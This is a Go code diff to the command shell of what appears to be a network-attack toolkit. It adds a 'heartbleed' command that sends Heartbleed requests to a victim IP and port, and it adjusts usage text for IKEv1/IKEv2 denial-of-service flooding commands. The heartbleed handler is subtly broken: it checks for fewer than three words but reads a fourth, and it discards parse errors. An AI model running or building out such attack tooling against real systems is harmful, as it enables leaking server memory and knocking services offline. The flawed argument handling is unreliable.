@@ -49,6 +49,9 @@ func help() {
 	fmt.Println("Available flags: -c concurrent packets | -s sequential packets")
 	fmt.Println("To perform this attack type: ikev2dos <flag> <number_of_packets> <destination_ip> <interface>")
 	fmt.Println("")
+	fmt.Println("HeartBleed - Consists of performing a HeartBleed attack inside a TLS session")
+	fmt.Println("To perform this attack type: heartbleed <victimIP:port> <length> <data>")
+	fmt.Println("")
 }
 
 // main function of the library, it launches a shell that can be used to
@@ -151,7 +154,7 @@ func main() {
 		case "ikev1dos":
 			if len(cmdWords) < 4 {
 				fmt.Println("To use ikev1dos provide the following instructions:")
-				fmt.Println("ikev1dos <flag> <number_of_packets> <destination_ip> <interface> <batch_size>")
+				fmt.Println("ikev1dos <flag> <number_of_packets> <destination_ip> <interface>")
 
 			} else if cmdWords[1] == "-s" {
 				npackets, err := strconv.Atoi(cmdWords[2])
@@ -184,8 +187,16 @@ func main() {
 				}
 				go higherlevel.IKEv2DoS(npackets, cmdWords[3], cmdWords[4])
 			} else {
-				fmt.Println("Please use one of the available flags: -c concurrent | -b batch | -s sequential")
+				fmt.Println("Please use one of the available flags: -c concurrent | -s sequential")
 				fmt.Println("")
+			}
+		case "heartbleed":
+			if len(cmdWords) < 3 {
+				fmt.Println("To use heartbleed provide the following instructions:")
+				fmt.Println("heartbleed <victimIP:port> <length> <data>")
+			} else {
+				parsedLength, _ := strconv.ParseUint(cmdWords[2], 10, 16)
+				higherlevel.HeartBleed(cmdWords[1], uint16(parsedLength), cmdWords[3])
 			}
 		}
 
